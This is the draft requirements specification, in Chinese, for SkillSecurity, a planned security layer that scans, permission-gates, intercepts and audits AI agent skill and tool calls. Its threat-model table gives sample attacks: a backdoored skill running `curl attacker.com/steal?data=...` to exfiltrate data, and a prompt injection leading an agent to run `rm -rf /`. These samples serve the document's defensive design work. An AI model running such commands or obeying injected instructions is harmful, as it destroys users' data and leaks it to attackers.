# SkillSecurity 需求规格说明书

> **版本**: 0.2.0  
> **日期**: 2026-03-11  
> **状态**: Draft (Revised)

---

## 1. 产品愿景

**一句话描述：**

为 AI Agent 的 Skill/工具调用提供一键启用的安全防护层——Skill 的"杀毒软件"。

**要解决的核心问题：**

随着 Skill 生态扩展，AI Agent 的工具调用越来越像 LLM 操作系统上的"应用程序"，但目前缺乏系统级安全机制：

- Skill 可执行高危操作（删文件、执行命令、发通知、访问网络），但无人审查
- 恶意或有缺陷的 Skill 可以越权操作，没有权限边界
- 现有安全方案聚焦内容过滤（guardrails），不关注工具调用安全
- 开发者安装第三方 Skill 时无法评估其安全性
- 企业部署缺乏审计、合规、权限控制能力

**产品定位：**

SkillSecurity = **静态扫描（安装前）** + **权限声明（安装时）** + **运行时拦截（执行时）** + **审计追溯（执行后）**

类比传统安全体系：

| 传统操作系统 | SkillSecurity（LLM OS） |
|---|---|
| 杀毒软件（静态扫描） | Skill 安装前代码扫描 |
| 应用权限系统（Android/iOS） | Skill 权限声明与用户确认 |
| 防火墙（运行时拦截） | 工具调用实时策略拦截 |
| 安全审计日志 | 操作记录与合规追溯 |

**产品分层：**

| 层级 | 定位 | 目标用户 |
|---|---|---|
| **Core（开源核心）** | 一键部署、零配置可用 | 个人开发者 |
| **Pro（可选扩展）** | Web 管理、多渠道告警、高级查询 | 团队 / 小企业 |
| **Enterprise（商业版）** | SSO、GDPR、异常检测、合规报告 | 大企业 |

---

## 2. 威胁模型

> 详见 [docs/threat-model.md](docs/threat-model.md)

SkillSecurity 需要防御的四类威胁：

| 威胁类型 | 描述 | 典型场景 | 主要防御手段 |
|---|---|---|---|
| **恶意 Skill** | 开发者有意植入后门 | Skill 代码中隐藏 `os.system("curl attacker.com/steal?data=...")` | 静态扫描 + 权限声明 |
| **缺陷 Skill** | 代码 bug 导致越权 | 路径拼接错误，本想写 `/tmp/out` 却写了 `/etc/passwd` | 运行时拦截 + 权限边界 |
| **Prompt Injection** | Agent 被注入恶意指令 | 用户输入诱导 Agent 调用 Skill 执行 `rm -rf /` | 运行时拦截 + 行为监控 |
| **供应链攻击** | Skill 依赖被篡改 | Skill 依赖的第三方库被注入恶意代码 | 静态扫描 + 依赖审计 |

---

## 3. 目标用户

### 3.1 个人开发者

- **画像**：自己跑 AI Agent，怕误操作删库
- **核心需求**：快速启用、配置简单、危险操作前提醒、免费/开源
- **典型场景**："我的 Agent 说要 `rm -rf /tmp`，我想知道这安不安全"

### 3.2 Skill/Plugin 开发者

- **画像**：开发第三方 Skill，需要证明安全性
- **核心需求**：声明权限范围、用户安装时可见、运行时不越权
- **典型场景**："我的天气 Skill 只需要读网络，不应该能执行命令"

### 3.3 AI 框架维护者

- **画像**：维护 LangChain / AutoGen 等框架，想内置安全能力
- **核心需求**：SDK 集成简单、不破坏现有功能、可配置
- **典型场景**："我想在框架里默认带上安全防护，但不想自己写"

### 3.4 企业运维/安全团队

- **画像**：负责公司 AI Agent 部署，需要合规审计
- **核心需求**：完整操作日志、权限分级、异常告警、合规
- **典型场景**："上周三凌晨 3 点，哪个 Agent 执行了删除操作？"

---

## 4. 架构概述

> 详见 [docs/architecture-overview.md](docs/architecture-overview.md)

**集成模式：混合模式（SDK + 独立服务）**

```
┌─────────────────────────────────────────────┐
│                  AI Agent                    │
│                                             │
│  ┌──────────┐    ┌──────────────────────┐   │
│  │  LLM     │───▶│  Skill/Tool 调用     │   │
│  └──────────┘    └──────────┬───────────┘   │
│                             │               │
│                    ┌────────▼────────┐      │
│                    │  SkillSecurity  │      │
│                    │  SDK (嵌入式)    │      │
│                    └────────┬────────┘      │
│                             │               │
└─────────────────────────────┼───────────────┘
                              │ (可选) gRPC/HTTP
                     ┌────────▼────────┐
                     │  SkillSecurity  │
                     │  Server (独立)   │
                     └─────────────────┘
```

- **轻量模式**：仅 SDK，嵌入 Agent 进程，零网络开销，适合个人开发者
- **服务模式**：SDK + 独立 Server，支持集中管理，适合团队/企业

**技术选型方向：**

| 组件 | 推荐 | 理由 |
|---|---|---|
| 核心引擎 | Go 或 Rust | 单二进制、跨平台、高性能 |
| Python SDK | Python 包装层 | 覆盖 AI 生态主流 |
| Node.js SDK | Node 包装层 | 覆盖 Web/MCP 生态 |
| 配置格式 | YAML | 人类友好、生态成熟 |
| 通信协议 | gRPC (内部) / REST (外部) | 性能与通用性兼顾 |

---

## 5. 功能需求（按阶段划分）

### Phase 1：核心拦截引擎（4 周）

> 详见 [docs/phase-1-core-interception.md](docs/phase-1-core-interception.md)

**目标**：能跑起来，能拦住危险操作

| ID | 功能 | 描述 |
|---|---|---|
| F1 | 工具调用拦截 | 在工具执行前进行规则匹配拦截 |
| F2 | 策略配置 | YAML 配置文件定义安全规则 |
| F3 | 决策与执行 | Allow / Block / Ask 三种决策 |
| F14 | CLI 输出 | 终端实时显示拦截结果和风险提示 |

### Phase 2：权限声明与审计（4 周）

> 详见 [docs/phase-2-permission-and-audit.md](docs/phase-2-permission-and-audit.md)

**目标**：Skill 有权限边界，操作可追溯

| ID | 功能 | 描述 |
|---|---|---|
| F12 | Skill 权限声明 | skill-manifest.json 声明所需权限 |
| F15 | Skill 静态扫描 | 安装前扫描代码中的危险模式 |
| F4 | 审计日志 | 记录所有工具调用和决策 |

### Phase 3：多框架 SDK 与生态（4 周）

> 详见 [docs/phase-3-sdk-and-ecosystem.md](docs/phase-3-sdk-and-ecosystem.md)

**目标**：主流框架可快速集成

| ID | 功能 | 描述 |
|---|---|---|
| F6 | 多框架适配 | Python SDK / Node.js SDK / REST API |
| F8 | 策略模板库 | 开箱即用的安全策略模板 |
| F16 | 社区规则共享 | 社区贡献的规则包和威胁特征库 |

### Phase 4：告警与用户交互（4 周）

> 详见 [docs/phase-4-alert-and-interaction.md](docs/phase-4-alert-and-interaction.md)

**目标**：完善通知体系和用户确认流程

| ID | 功能 | 描述 |
|---|---|---|
| F5 | 告警通知 | Webhook + 多渠道告警 |
| F7 | 用户确认界面 | Ask 决策时的交互确认 |
| F9 | 查询与导出 | 审计日志查询、过滤、导出 |

### Pro / Enterprise 扩展

> 详见 [docs/tier-pro-enterprise.md](docs/tier-pro-enterprise.md)

| ID | 功能 | 层级 |
|---|---|---|
| F10 | Web 管理界面 | Pro |
| F11 | 异常检测 | Enterprise |
| F13 | 性能优化 | Pro |
| F17 | 沙箱预执行 | Enterprise |
| F18 | SSO / GDPR | Enterprise |

---

## 6. 非功能需求

### 6.1 性能

| 指标 | 目标 |
|---|---|
| 拦截延迟（平均） | < 10ms |
| 拦截延迟（P99） | < 50ms |
| 吞吐量 | ≥ 1000 次/秒（单实例） |
| 日志写入 | 异步，不阻塞主流程 |
| 冷启动 | < 5 秒 |

### 6.2 可靠性

- 可用性 ≥ 99.9%（单实例）
- 支持自动重启、崩溃恢复
- 日志持久化，不丢失
- 安全层故障时支持配置默认行为（fail-open / fail-close）

### 6.3 安全

- 策略文件防篡改（签名验证）
- 日志敏感信息自动脱敏
- API 访问需认证（API Key / JWT）
- 自身操作也记录审计日志
- 定期依赖漏洞扫描

### 6.4 隐私

- 本地优先：支持纯本地模式，不上传任何数据
- 数据最小化：只记录必要信息
- 可配置日志保留期限

### 6.5 易用性

- 首次安装 < 5 分钟
- 默认配置即可用，无需修改
- 文档：快速开始 + API 文档 + FAQ
- 错误提示人类可读，附带解决建议

### 6.6 可维护性

- 单元测试覆盖率 ≥ 80%
- 支持插件机制（自定义规则、通知渠道）
- 支持 Prometheus 指标监控

---

## 7. 约束条件

### 7.1 技术约束

- 核心引擎：Go 或 Rust（待技术选型确定）
- 部署：Docker 一键启动 + 本地二进制安装
- 依赖最小化（降低攻击面）

### 7.2 业务约束

- 开源协议：Apache 2.0
- 无专利限制
- 不绑定特定云服务商

### 7.3 时间约束

| 里程碑 | 周期 | 产出 |
|---|---|---|
| Phase 1 MVP | 第 1-4 周 | 核心拦截可用 |
| Phase 2 | 第 5-8 周 | 权限 + 审计 |
| Phase 3 | 第 9-12 周 | SDK + 生态 |
| Phase 4 | 第 13-16 周 | 告警 + 交互 |
| v1.0.0 | 第 16 周 | 正式发布 |

---

## 8. 成功指标

### 8.1 产品指标

| 指标 | 目标 | 测量方式 |
|---|---|---|
| 拦截准确率 | ≥ 99% 危险操作被拦截 | 测试集验证 |
| 误报率 | < 1% 正常操作被误拦 | 用户反馈 |
| 延迟开销 | < 10ms 每次检查 | 性能测试 |
| 框架支持 | ≥ 3 个主流框架（v1.0） | 集成测试 |

### 8.2 社区指标（6 个月）

| 指标 | 目标 | 测量方式 |
|---|---|---|
| GitHub Stars | ≥ 500 | GitHub API |
| 下载量 | ≥ 10,000 | PyPI / npm |
| 贡献者 | ≥ 20 | GitHub API |
| 生产部署 | ≥ 50 | 用户调研 |

---

## 9. 用户故事

- **US1**：作为个人开发者，我希望 5 分钟内启用安全防护，不用担心 Agent 误操作
- **US2**：作为 Skill 开发者，我希望声明我的 Skill 只需要网络读取权限，证明它是安全的
- **US3**：作为框架维护者，我希望 3 行代码集成 SkillSecurity
- **US4**：作为企业安全管理员，我希望查询过去 30 天所有危险操作做合规审计
- **US5**：作为运维人员，我希望凌晨有危险操作时收到通知及时响应
- **US6**：作为高级用户，我希望自定义安全策略适配特殊需求

---

## 10. 文档索引

| 文档 | 路径 | 内容 |
|---|---|---|
| 威胁模型 | [docs/threat-model.md](docs/threat-model.md) | 四类威胁详细分析与防御策略 |
| 架构概述 | [docs/architecture-overview.md](docs/architecture-overview.md) | 系统架构、集成模式、技术选型 |
| Phase 1 | [docs/phase-1-core-interception.md](docs/phase-1-core-interception.md) | 核心拦截引擎功能详细需求 |
| Phase 2 | [docs/phase-2-permission-and-audit.md](docs/phase-2-permission-and-audit.md) | 权限声明与审计日志详细需求 |
| Phase 3 | [docs/phase-3-sdk-and-ecosystem.md](docs/phase-3-sdk-and-ecosystem.md) | 多框架 SDK 与社区生态详细需求 |
| Phase 4 | [docs/phase-4-alert-and-interaction.md](docs/phase-4-alert-and-interaction.md) | 告警通知与用户交互详细需求 |
| Pro/Enterprise | [docs/tier-pro-enterprise.md](docs/tier-pro-enterprise.md) | 进阶与企业版扩展功能 |
